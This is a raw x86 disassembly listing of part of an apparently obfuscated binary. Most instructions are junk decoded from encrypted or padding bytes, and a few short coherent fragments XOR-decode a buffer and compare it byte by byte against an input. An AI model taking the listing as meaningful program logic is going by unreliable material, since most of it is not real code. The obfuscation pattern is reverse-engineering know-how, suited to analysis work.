  403259:	(bad)  
  40325b:	pop    edi
  40325c:	mov    al,0xbe
  40325e:	mov    ecx,0x7e16d251
  403263:	jle    0x403213
  403265:	jg     0x4032e5
  403267:	jle    0x4032c2
  403269:	nop
  40326a:	cmc    
  40326b:	push   ss
  40326c:	push   es
  40326d:	push   edx
  40326e:	cli    
  40326f:	leave  
  403270:	adc    al,0x69
  403272:	nop
  403273:	add    al,0x38
  403275:	mov    al,ds:0x67b13a19
  40327a:	jg     0x4032d4
  40327c:	mov    BYTE PTR [ebx-0x9],cl
  40327f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403280:	jp     0x403249
  403282:	call   0x89712438
  403287:	pop    esp
  403288:	pop    ss
  403289:	out    dx,al
  40328a:	cdq    
  40328b:	lods   eax,DWORD PTR ds:[esi]
  40328c:	mov    DWORD PTR [esi],edx
  40328e:	dec    ebx
  40328f:	pop    ebx
  403290:	fld    DWORD PTR [ecx+0x63]
  403293:	adc    ebx,DWORD PTR [ebp-0x640ab7ea]
  403299:	cmp    esp,DWORD PTR [ecx]
  40329b:	mov    eax,ds:0x80d00fd8
  4032a0:	sbb    BYTE PTR [edx-0x1ce1e8a4],cl
  4032a6:	xchg   ebp,eax
  4032a7:	sar    ah,cl
  4032a9:	adc    ebp,DWORD PTR [edx+0x5cf0cdee]
  4032af:	mov    bl,0x87
  4032b1:	(bad)  
  4032b2:	jg     0x403257
  4032b4:	mov    dh,0xbe
  4032b6:	mov    ds:0xdfd2ab23,al
  4032bb:	dec    eax
  4032bc:	test   DWORD PTR [eax+0x713c16fb],ebx
  4032c2:	test   ecx,ebp
  4032c4:	popf   
  4032c5:	push   esi
  4032c6:	cdq    
  4032c7:	fwait
  4032c8:	imul   ebx,DWORD PTR [ebx-0x36],0x4570970b
  4032cf:	xchg   DWORD PTR [edx+esi*4+0x7a72bd06],esp
  4032d6:	mov    ah,0x1c
  4032d8:	punpckhwd mm1,QWORD PTR [eax+0x5a8d3de5]
  4032df:	test   al,0x90
  4032e1:	or     al,0x7c
  4032e3:	and    eax,ebx
  4032e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032e6:	xor    DWORD PTR [ebx+eax*8-0x99a5579],edx
  4032ed:	clc    
  4032ee:	push   cs
  4032ef:	ret    0x19cf
  4032f2:	xor    eax,0xb23234d8
  4032f7:	popf   
  4032f8:	pop    ebp
  4032f9:	mov    ds:0xb7fcec94,eax
  4032fe:	sub    al,0x40
  403300:	pusha  
  403301:	mov    DWORD PTR [esi+0x22aa4479],esp
  403307:	jb     0x40334b
  403309:	inc    edi
  40330a:	jnp    0x40332d
  40330c:	mov    ds:0x9f2c0f56,eax
  403311:	arpl   WORD PTR [ecx+edx*1+0x66ef7589],bx
  403318:	ss inc ecx
  40331a:	sub    eax,0x92361817
  40331f:	ficom  WORD PTR [edi+edi*1-0x68]
  403323:	aam    0x8f
  403325:	bound  ebp,QWORD PTR [ebx]
  403327:	imul   esi,ecx,0xffffffb3
  40332a:	or     eax,DWORD PTR [ecx+eiz*1-0x8ccbbe9]
  403331:	mov    bh,0xae
  403333:	pop    ds
  403334:	mov    ecx,0x402b4f6c
  403339:	daa    
  40333a:	sbb    eax,0x3b8a1515
  40333f:	mov    edx,0xef4a4900
  403344:	push   eax
  403345:	(bad)  
  403346:	fcomp  DWORD PTR [ecx]
  403348:	sbb    bh,0x36
  40334b:	jb     0x40333e
  40334d:	xor    eax,0xae9c24a5
  403352:	xor    dl,BYTE PTR [edx+0x2209a5a6]
  403358:	mov    ebp,0x8767197d
  40335d:	sbb    eax,0x82dfd653
  403362:	cmp    al,0xc9
  403364:	sbb    BYTE PTR [edi+esi*4+0x61b5fe1f],al
  40336b:	push   eax
  40336c:	inc    esi
  40336d:	inc    esi
  40336e:	popf   
  40336f:	pop    edi
  403370:	sub    dh,bh
  403372:	mov    dh,0xe8
  403374:	loopne 0x403396
  403376:	not    BYTE PTR [esi-0x4d]
  403379:	enter  0x7a9,0xc3
  40337d:	push   0x0
  40337f:	xchg   ebx,eax
  403380:	mov    ds:0x7fa2a938,eax
  403385:	dec    esp
  403386:	or     WORD PTR ds:[ecx+edx*1+0x39],di
  40338c:	ret    0xdc36
  40338f:	dec    ecx
  403390:	jecxz  0x4033b6
  403392:	bound  ebp,QWORD PTR [edi]
  403394:	push   ebx
  403395:	xor    ebp,esp
  403397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403398:	fdivrp st(1),st
  40339a:	adc    al,0x94
  40339c:	ficomp WORD PTR [ebp-0x5d]
  40339f:	std    
  4033a0:	fs out 0x9c,eax
  4033a3:	jl     0x403411
  4033a5:	daa    
  4033a6:	sahf   
  4033a7:	lods   al,BYTE PTR ds:[esi]
  4033a8:	jb     0x4033ed
  4033aa:	ror    edx,0xf6
  4033ad:	daa    
  4033ae:	pop    esi
  4033af:	mov    ds:0xd2d38661,al
  4033b4:	int    0x2f
  4033b6:	lea    ebp,[edx+0x3b]
  4033b9:	dec    ecx
  4033ba:	xchg   esi,eax
  4033bb:	neg    BYTE PTR [eax]
  4033bd:	sti    
  4033be:	jge    0x403418
  4033c0:	ins    BYTE PTR es:[edi],dx
  4033c1:	xor    esp,DWORD PTR [edi+0x7719d02d]
  4033c7:	fisttp DWORD PTR [edi+0x34f0606e]
  4033cd:	cs fwait
  4033cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033d0:	cmc    
  4033d1:	xchg   DWORD PTR [eax-0x367f9e61],ecx
  4033d7:	pop    edi
  4033d8:	mov    edx,0xf7293d0d
  4033dd:	sar    edi,1
  4033df:	adc    ebx,esi
  4033e1:	sub    al,0xd1
  4033e3:	test   ebp,ebp
  4033e5:	xor    ebp,DWORD PTR [ebx+ecx*4-0x7a]
  4033e9:	xchg   edx,eax
  4033ea:	jmp    0x9324d78c
  4033ef:	jne    0x4033a6
  4033f1:	add    edi,esi
  4033f3:	adc    al,0xb5
  4033f5:	xchg   esi,eax
  4033f6:	cmp    DWORD PTR [edx-0x64],esi
  4033f9:	mov    edx,0xabbb2cce
  4033fe:	push   ebx
  4033ff:	in     al,0xef
  403401:	lds    ebp,FWORD PTR [esi]
  403403:	adc    DWORD PTR [ebp+0x79],edi
  403406:	inc    ecx
  403407:	(bad)  
  403408:	push   ebp
  403409:	pop    ebp
  40340a:	dec    esp
  40340b:	call   0x6746:0xff49a667
  403412:	sahf   
  403413:	outs   dx,DWORD PTR ds:[esi]
  403414:	shl    DWORD PTR [ebx*8+0x729bbedc],cl
  40341b:	xor    al,BYTE PTR [eax]
  40341d:	neg    DWORD PTR ds:0x430459
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	popf   
  403453:	push   ebx
  403454:	xchg   ebx,eax
  403455:	mov    dh,0x2
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x4033fc
  40345f:	sub    BYTE PTR [ebp-0x7a0e1151],al
  403465:	dec    ecx
  403466:	lock or eax,0x2f59d23a
  40346c:	pop    eax
  40346d:	or     eax,0x489bd8bf
  403472:	jge    0x4034ba
  403474:	pop    ebp
  403475:	add    esi,DWORD PTR [edi+eiz*4+0xc]
  403479:	jle    0x4034d0
  40347b:	pop    edi
  40347c:	add    al,0x82
  40347e:	outs   dx,DWORD PTR ds:[esi]
  40347f:	pmulhuw mm7,QWORD PTR cs:[edi]
  403483:	push   ebx
  403484:	in     eax,0xf5
  403486:	mov    DWORD PTR [ebx+0x5b],esp
  403489:	call   0x5eb6:0xc5c6ffd8
  403490:	xchg   esi,eax
  403491:	cwde   
  403492:	mov    dh,0xb1
  403494:	(bad)  
  403495:	push   ebx
  403496:	je     0x403488
  403498:	and    DWORD PTR [ebx+0x5ec653db],ebp
  40349e:	das    
  40349f:	or     cl,BYTE PTR ds:0x5f7456aa
  4034a5:	xor    dh,bh
  4034a7:	jg     0x4034d4
  4034a9:	test   al,0x5e
  4034ab:	imul   edx,DWORD PTR [eax+0x526671ef],0xa80908a1
  4034b5:	ins    BYTE PTR es:[edi],dx
  4034b6:	(bad)  
  4034b7:	mov    BYTE PTR [edi+ebp*2-0x2c],dl
  4034bb:	fs out dx,al
  4034bd:	leave  
  4034be:	int3   
  4034bf:	push   cs
  4034c0:	cmp    BYTE PTR [esi+0xf],ah
  4034c3:	stc    
  4034c4:	clc    
  4034c5:	ret    0x8536
  4034c8:	inc    ebp
  4034c9:	add    al,0x80
  4034cb:	js     0x403508
  4034cd:	fsubr  QWORD PTR [edx+0x7]
  4034d0:	or     cl,BYTE PTR [edi]
  4034d2:	test   BYTE PTR [ebx-0x3c],bh
  4034d5:	mov    al,ds:0x5cc588ec
  4034da:	sbb    BYTE PTR [ebp-0x2b],cl
  4034dd:	mov    ebx,0x84219a7c
  4034e2:	fidivr DWORD PTR [eax+ebp*2-0x38]
  4034e6:	pop    ebx
  4034e7:	sbb    DWORD PTR [ebp+0x347e6a6f],eax
  4034ed:	icebp  
  4034ee:	int3   
  4034ef:	retf   
  4034f0:	aam    0xe0
  4034f2:	cmp    eax,DWORD PTR [edx+0x79c53f7c]
  4034f8:	and    ch,BYTE PTR [ebx+0x22481a1d]
  4034fe:	ins    BYTE PTR es:[edi],dx
  4034ff:	xchg   edx,eax
  403500:	mov    cl,0xd7
  403502:	cwde   
  403503:	and    DWORD PTR [esi+0x3d],0x1f
  403507:	mov    ebp,0xdb28fc5f
  40350c:	push   ebx
  40350d:	addr16 jle 0x403553
  403510:	popa   
  403511:	test   eax,0x7151e63b
  403516:	out    0x85,eax
  403518:	dec    ebp
  40351a:	(bad)  
  40351b:	(bad)  
  40351c:	jne    0x4034e4
  40351e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40351f:	xlat   BYTE PTR ds:[ebx]
  403520:	fwait
  403521:	jge    0x40352f
  403523:	leave  
  403524:	pop    es
  403525:	dec    ecx
  403526:	push   es
  403527:	pop    edx
  403528:	mov    eax,0xb4b3ec96
  40352d:	aad    0x7d
  40352f:	and    dl,ah
  403531:	mov    ch,0x73
  403533:	cmp    DWORD PTR [eax+eax*1-0x58d45e76],esp
  40353a:	mov    ss,WORD PTR [esi+esi*1]
  40353d:	pop    ebx
  40353e:	fcomi  st,st(0)
  403540:	inc    edx
  403541:	push   eax
  403542:	mov    edx,0x6cc4f40a
  403547:	add    DWORD PTR [ecx+0x4a180aea],edx
  40354d:	daa    
  40354e:	pusha  
  40354f:	inc    ecx
  403550:	je     0x40352a
  403552:	add    eax,0x931b6831
  403557:	lods   eax,DWORD PTR ds:[esi]
  403558:	jo     0x4034de
  40355a:	mov    ah,0x85
  40355c:	jmp    0x9242b73e
  403561:	sub    eax,0x737a6ab4
  403566:	jle    0x403591
  403568:	and    bh,BYTE PTR [ecx+0x37067ef3]
  40356e:	sar    BYTE PTR [esi+0x56],cl
  403571:	int3   
  403572:	lea    edi,[ecx-0x7b]
  403575:	imul   DWORD PTR [ebp-0x78]
  403578:	in     eax,0xc4
  40357a:	scas   al,BYTE PTR es:[edi]
  40357b:	(bad)  
  40357c:	fdiv   st,st(1)
  40357e:	fs push esi
  403580:	sbb    dh,0x4e
  403583:	cmp    DWORD PTR [esi],0x2
  403586:	and    DWORD PTR [edx-0x60],esi
  403589:	mov    ds:0x4c59aca2,al
  40358e:	pop    esi
  40358f:	int3   
  403590:	sub    cl,dh
  403592:	mov    edi,0x9a95966a
  403597:	mov    cl,0xd5
  403599:	xchg   edx,eax
  40359a:	add    BYTE PTR [esi],dl
  40359c:	aas    
  40359d:	fsub   DWORD PTR [ebp-0x2f]
  4035a0:	fistp  QWORD PTR [edx]
  4035a2:	xor    eax,0xd55af7de
  4035a7:	clc    
  4035a8:	rcl    BYTE PTR [eax+edi*1],cl
  4035ab:	cwde   
  4035ac:	dec    ebp
  4035ad:	vpcomw xmm4,xmm5,XMMWORD PTR [edx+0x6bdcf814],0x99
  4035b7:	sub    bl,BYTE PTR [edi-0x2d5dcffb]
  4035bd:	mov    bh,0xe9
  4035bf:	pop    ebx
  4035c0:	(bad)  
  4035c1:	enter  0xe59a,0xf9
  4035c5:	xchg   DWORD PTR [esi+eiz*4+0x65],ecx
  4035c9:	push   ebp
  4035ca:	dec    ebp
  4035cb:	mov    DWORD PTR [ecx+0x1b],eax
  4035ce:	(bad)  
  4035cf:	fwait
  4035d0:	jecxz  0x40360d
  4035d2:	ss int3 
  4035d4:	fs jno 0x403576
  4035d7:	loopne 0x4035c7
  4035d9:	aaa    
  4035da:	pushf  
  4035db:	jns    0x403600
  4035dd:	sar    DWORD PTR [ecx],cl
  4035df:	aaa    
  4035e0:	test   BYTE PTR [eax+0x26],bl
  4035e3:	out    0xde,eax
  4035e5:	add    eax,0xb93bcd40
  4035ea:	loopne 0x4035d3
  4035ec:	sbb    eax,0xdfd9c809
  4035f1:	inc    ebp
  4035f2:	loope  0x4035d7
  4035f4:	lods   eax,DWORD PTR ds:[esi]
  4035f5:	mov    bl,0x1a
  4035f7:	inc    ecx
  4035f8:	rcl    BYTE PTR [esp+ebp*8],1
  4035fb:	and    BYTE PTR [esi+eiz*8],bl
  4035fe:	jno    0x40367f
  403600:	inc    ecx
  403601:	and    eax,0x3b19d998
  403606:	js     0x40358a
  403608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403609:	(bad)  
  40360a:	nop
  40360b:	lods   eax,DWORD PTR ds:[esi]
  40360c:	xor    bl,BYTE PTR [ebx+esi*1-0x2f]
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x423dd7c8
  40366f:	jg     0x403669
  403671:	lss    edx,FWORD PTR ds:0x7fae7e7e
  403678:	jle    0x4036f8
  40367a:	out    0xbd,eax
  40367c:	sbb    al,0xd
  40367e:	rol    BYTE PTR cs:[ecx-0x35677ceb],cl
  403685:	jmp    0xb1d5:0x7b20411
  40368c:	fidiv  WORD PTR ds:0xe1ca38dc
  403692:	into   
  403693:	mov    eax,ds:0xb493d2d7
  403698:	jg     0x4036e0
  40369a:	mov    al,0xf9
  40369c:	sub    al,0x55
  40369e:	imul   eax,DWORD PTR [edx+0x33],0x49f36563
  4036a5:	mov    edi,0xb61e23eb
  4036aa:	hlt    
  4036ab:	push   0x14
  4036ad:	mov    edx,0x974cd86c
  4036b2:	call   0xa72ede76
  4036b7:	jmp    0x19f2:0xb8a5b851
  4036be:	sub    ecx,DWORD PTR [ecx-0x54ddd634]
  4036c4:	push   ebx
  4036c5:	arpl   dx,sp
  4036c7:	xor    BYTE PTR [ecx-0x13223fe0],dl
  4036cd:	stc    
  4036ce:	xchg   edx,eax
  4036cf:	ins    BYTE PTR es:[edi],dx
  4036d0:	cli    
  4036d1:	push   ebp
  4036d2:	jbe    0x403693
  4036d4:	mov    cl,0x29
  4036d6:	and    al,0x9e
  4036d8:	push   ss
  4036d9:	sub    DWORD PTR [ebx+ebx*8+0x20],ebp
  4036dd:	popf   
  4036de:	loop   0x40370c
  4036e0:	enter  0x73db,0x21
  4036e4:	inc    ecx
  4036e5:	jle    0x403750
  4036e7:	jno    0x4036ab
  4036e9:	jecxz  0x4036b8
  4036eb:	fucompp 
  4036ed:	jg     0x403760
  4036ef:	or     DWORD PTR [ebp-0x28],eax
  4036f2:	mov    ah,0x3b
  4036f4:	adc    ecx,DWORD PTR [ebx]
  4036f6:	pop    es
  4036f7:	outs   dx,BYTE PTR ds:[esi]
  4036f8:	fstp   DWORD PTR [ebx-0x1d]
  4036fb:	je     0x4036e7
  4036fd:	(bad)  
  4036fe:	xor    BYTE PTR [eax],ah
  403700:	mov    cl,0xb1
  403702:	sub    eax,0x9d95556b
  403707:	cmp    dh,al
  403709:	adc    cl,dl
  40370b:	adc    ecx,DWORD PTR [ecx+0x5262aec8]
  403711:	jle    0x4036f4
  403713:	and    edi,DWORD PTR ds:0x45ea9c76
  403719:	and    eax,0xbf80e860
  40371e:	mov    ah,0x44
  403720:	arpl   dx,si
  403722:	jb     0x403734
  403724:	add    al,0x55
  403726:	rcl    BYTE PTR [eax],1
  403728:	dec    eax
  403729:	sbb    eax,0x5d333ac6
  40372e:	jne    0x4036c6
  403730:	xor    esi,DWORD PTR ds:0xee7c7804
  403736:	jbe    0x403796
  403738:	inc    esi
  403739:	enterw 0x58d0,0x5a
  40373e:	fs pop edi
  403740:	test   cl,bl
  403742:	sti    
  403743:	loopne 0x403743
  403745:	mov    edx,DWORD PTR [esi-0x7f13b9a4]
  40374b:	and    BYTE PTR [ebp+ecx*1-0x44e601fa],0x6a
  403753:	aam    0x97
  403755:	dec    edi
  403756:	xor    edx,DWORD PTR [ebx+0x60b76275]
  40375c:	sub    BYTE PTR [edi+0x3b],bh
  40375f:	mov    BYTE PTR es:[ecx],al
  403762:	(bad)  
  403763:	mov    bh,0x26
  403765:	imul   ebx,eax,0xffffffac
  403768:	fsub   QWORD PTR ds:0x47ee2bcb
  40376e:	rol    BYTE PTR [ebp-0x72],0xac
  403772:	add    eax,0xee532fab
  403777:	pop    edx
  403778:	in     al,0x88
  40377a:	shl    esp,cl
  40377c:	inc    eax
  40377e:	fwait
  40377f:	jno    0x403745
  403781:	xchg   ecx,eax
  403782:	jmp    0x15fc56bc
  403787:	or     al,0x12
  403789:	(bad)  
  40378a:	inc    ebp
  40378b:	test   BYTE PTR [edi],dh
  40378d:	sub    dl,0x28
  403790:	cdq    
  403791:	pop    edx
  403792:	das    
  403793:	dec    ebp
  403794:	push   es
  403795:	cmp    eax,0x8818e2e5
  40379a:	dec    esi
  40379b:	xchg   edi,eax
  40379c:	xchg   BYTE PTR [ebx+eiz*4-0x30],ch
  4037a0:	ret    0x3b86
  4037a3:	sub    al,0x34
  4037a5:	push   es
  4037a6:	pop    ss
  4037a7:	in     al,0x8b
  4037a9:	out    0x26,al
  4037ab:	leave  
  4037ac:	pushf  
  4037ad:	and    bh,bh
  4037af:	xchg   esp,eax
  4037b0:	mov    fs,edx
  4037b2:	and    BYTE PTR [eax+0x59],cl
  4037b5:	dec    edi
  4037b6:	push   esp
  4037b7:	enter  0x790e,0x6d
  4037bb:	inc    eax
  4037bc:	dec    ebp
  4037bd:	push   esi
  4037be:	pop    fs
  4037c0:	sub    al,0xa5
  4037c2:	jmp    0x40377f
  4037c4:	hlt    
  4037c5:	push   cs
  4037c6:	mov    fs,WORD PTR ds:[ebx-0x2dca0bf]
  4037cd:	push   0x3
  4037cf:	cmp    al,0x94
  4037d1:	loop   0x403841
  4037d3:	inc    ecx
  4037d4:	jl     0x4037dc
  4037d6:	pushf  
  4037d7:	push   cs
  4037d8:	jae    0x40381a
  4037da:	xchg   edi,eax
  4037db:	shr    BYTE PTR [esi+ebp*8],cl
  4037de:	jmp    0x5ee3919e
  4037e3:	xchg   ecx,eax
  4037e4:	or     DWORD PTR [ebx-0xfcf2b57],esp
  4037ea:	or     edi,DWORD PTR [esi+ecx*8-0x24dd6875]
  4037f1:	pop    ss
  4037f2:	aaa    
  4037f3:	pop    esi
  4037f4:	sub    bl,BYTE PTR [esi+eax*1-0x18]
  4037f8:	fsubr  st,st(5)
  4037fa:	fiadd  WORD PTR [eax+0x76]
  4037fd:	jle    0x403817
  4037ff:	faddp  st(1),st
  403801:	fsub   st(5),st
  403803:	push   edx
  403804:	je     0x4037ab
  403806:	dec    ecx
  403807:	loopne 0x403882
  403809:	xor    al,0x7f
  40380b:	inc    esp
  40380c:	popa   
  40380d:	test   BYTE PTR ds:0x96b60d22,bh
  403813:	sti    
  403814:	mov    ch,0x3e
  403816:	test   al,0x2d
  403818:	or     DWORD PTR [ecx+0x46],eax
  40381b:	clc    
  40381c:	ror    ecx,0xb4
  40381f:	hlt    
  403820:	les    ebx,FWORD PTR [edx*4-0x4fcef186]
  403827:	cmp    ebx,DWORD PTR [ebx+0x10558b47]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x1b411823
  403845:	inc    ebx
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x40384b
  40384f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403851:	jo     0x40385b
  403853:	mov    ecx,0xeef3c5d7
  403858:	or     DWORD PTR [edi],ecx
  40385a:	jl     0x403815
  40385c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40385d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40385e:	sub    BYTE PTR [edi-0x594d718],0xd9
  403865:	add    ebx,esp
  403867:	nop
  403868:	add    dl,bh
  40386a:	xor    DWORD PTR [edi+eax*4-0x3],edi
  40386e:	mov    ebx,0x8090a666
  403873:	fldcw  WORD PTR [edx+edx*2-0xbaf8084]
  40387a:	dec    edx
  40387b:	in     al,dx
  40387c:	add    ah,BYTE PTR [edi+0x1b]
  40387f:	leave  
  403880:	add    ebp,edx
  403882:	jp     0x403903
  403884:	and    eax,DWORD PTR [ecx-0x52]
  403887:	(bad)  
  403888:	idiv   BYTE PTR [edi]
  40388a:	add    al,0xe7
  40388c:	arpl   WORD PTR [ecx],sp
  40388e:	inc    eax
  40388f:	mov    ah,al
  403891:	imul   ecx,DWORD PTR [ebx],0xe212816b
  403897:	lock jnp 0x4038eb
  40389a:	lods   eax,DWORD PTR ds:[esi]
  40389b:	pop    esp
  40389c:	(bad)  
  40389e:	popa   
  40389f:	dec    edi
  4038a0:	mov    eax,ds:0xa8d0ea3f
  4038a5:	xor    bl,BYTE PTR [ecx]
  4038a7:	sahf   
  4038a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038a9:	pop    esi
  4038aa:	adc    ah,0x32
  4038ad:	push   ebx
  4038ae:	lods   eax,DWORD PTR ds:[esi]
  4038af:	cdq    
  4038b0:	je     0x40392a
  4038b2:	inc    ebx
  4038b3:	and    al,0xa
  4038b5:	sbb    al,0x69
  4038b7:	lock loopne 0x4038b4
  4038ba:	call   0x5b20:0xab5b2ae5
  4038c1:	cwde   
  4038c2:	inc    ebx
  4038c3:	inc    esi
  4038c4:	scas   al,BYTE PTR es:[edi]
  4038c5:	mov    ebx,0x862ef20c
  4038ca:	retf   
  4038cb:	push   edi
  4038cc:	jo     0x4038cc
  4038ce:	in     al,0xd2
  4038d0:	and    DWORD PTR [edi+0x62],esp
  4038d3:	rcl    DWORD PTR [edi+0x5e4fa52e],0x4
  4038da:	push   0xffffffa2
  4038dc:	mov    eax,DWORD PTR [ecx+0x79]
  4038df:	jns    0x40392e
  4038e1:	cmp    al,0xb6
  4038e3:	xchg   ebx,eax
  4038e4:	and    DWORD PTR [edi-0x6394d8be],edx
  4038ea:	sbb    DWORD PTR [ebx-0x45],eax
  4038ed:	push   esi
  4038ee:	mov    ?,WORD PTR cs:[ebx-0x1665ab90]
  4038f5:	mov    esp,0x54e93954
  4038fa:	stos   BYTE PTR es:[edi],al
  4038fb:	mov    DWORD PTR [edx],ebp
  4038fd:	inc    BYTE PTR [eax]
  4038ff:	push   0x7b
  403901:	push   0x79
  403903:	jno    0x403976
  403905:	mov    al,0x24
  403907:	dec    edi
  403908:	ret    0x163
  40390b:	(bad)  [ebx-0x23]
  40390e:	repz mov WORD PTR [ecx-0x7c],?
  403912:	jb     0x403929
  403914:	aas    
  403915:	push   edx
  403916:	or     al,BYTE PTR [esi+0x8]
  403919:	daa    
  40391a:	loop   0x40398b
  40391c:	xchg   ebx,eax
  40391d:	mov    DWORD PTR [esi],ebp
  40391f:	in     al,0xad
  403921:	jb     0x403945
  403923:	fnsave [edi+ebx*1+0x1ba9edee]
  40392a:	adc    bh,BYTE PTR [esi+edi*4-0x70]
  40392e:	aam    0x48
  403930:	adc    edi,ecx
  403932:	push   0x57e005e0
  403937:	xor    al,0x28
  403939:	ret    0xb638
  40393c:	pop    ecx
  40393d:	dec    ebx
  40393e:	adc    dl,dl
  403940:	scas   eax,DWORD PTR es:[edi]
  403941:	push   0xffffffe5
  403943:	mov    eax,0xa85c8af4
  403948:	cld    
  403949:	sbb    al,0x79
  40394b:	inc    eax
  40394c:	inc    ecx
  40394d:	inc    eax
  40394e:	cmp    ebx,DWORD PTR [edx-0x60]
  403951:	push   esp
  403952:	ror    cl,0x11
  403955:	fwait
  403956:	test   al,0xa7
  403958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403959:	pop    ebp
  40395a:	or     al,0xcc
  40395c:	xchg   esi,eax
  40395d:	(bad)  
  40395e:	ret    
  40395f:	pusha  
  403960:	ret    0xf7df
  403963:	pop    esi
  403964:	adc    BYTE PTR [eax+0x32],0x5b
  403968:	push   ecx
  403969:	xchg   ecx,eax
  40396a:	xchg   esi,eax
  40396b:	dec    ebp
  40396c:	(bad)  
  40396d:	mov    edi,0x41d1b4f3
  403972:	pop    edi
  403973:	jmp    0x5fe5:0x823d962d
  40397a:	scas   eax,DWORD PTR es:[edi]
  40397b:	mov    BYTE PTR [eax-0x62],ah
  40397e:	(bad)  
  40397f:	retf   0x3874
  403982:	or     cl,BYTE PTR [ecx]
  403984:	(bad)  
  403985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403986:	daa    
  403987:	aaa    
  403988:	xchg   ecx,eax
  403989:	gs add al,0x5a
  40398c:	out    dx,eax
  40398d:	stos   DWORD PTR es:[edi],eax
  40398e:	or     DWORD PTR [edi+0x18],ebp
  403991:	sbb    esp,DWORD PTR [ebx+0x46]
  403994:	mov    ch,0xdf
  403996:	inc    eax
  403997:	inc    ebp
  403998:	cmp    BYTE PTR [esi-0x197e20de],0xf5
  40399f:	xor    esi,esp
  4039a1:	repz rcl DWORD PTR [edi+0x8],0x7
  4039a6:	scas   al,BYTE PTR es:[edi]
  4039a7:	xor    eax,0x68dc0239
  4039ac:	fdivr  QWORD PTR [ebx+0x71]
  4039af:	scas   al,BYTE PTR es:[edi]
  4039b0:	call   0x7b172b1e
  4039b5:	call   0xe79a2bc
  4039ba:	bound  esp,QWORD PTR [edx]
  4039bc:	xor    dl,dl
  4039be:	and    al,0x46
  4039c0:	and    BYTE PTR [ecx+0x6c],0x60
  4039c4:	mov    bh,0xd1
  4039c6:	pop    ds
  4039c7:	dec    ebx
  4039c8:	in     eax,dx
  4039c9:	jae    0x4039af
  4039cb:	(bad)  
  4039cc:	mov    edx,0x2056d529
  4039d1:	repz sbb DWORD PTR [edi-0x6c],ecx
  4039d5:	xchg   ebp,eax
  4039d6:	dec    ecx
  4039d7:	mov    ebp,0x3ee323c5
  4039dc:	stos   BYTE PTR es:[edi],al
  4039dd:	and    ah,BYTE PTR [ecx+0x6f2cc0de]
  4039e3:	push   ebx
  4039e4:	push   esi
  4039e5:	mov    dh,0x44
  4039e7:	ds nop
  4039e9:	out    0x45,eax
  4039eb:	in     eax,dx
  4039ec:	loope  0x403a02
  4039ee:	jmp    0xea0cb957
  4039f3:	and    DWORD PTR [eax],esp
  4039f5:	mov    WORD PTR [eax-0x70472973],fs
  4039fb:	pop    eax
  4039fc:	les    edi,FWORD PTR [edi-0x77]
  4039ff:	add    cl,BYTE PTR [ebx-0x3ecc07bb]
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
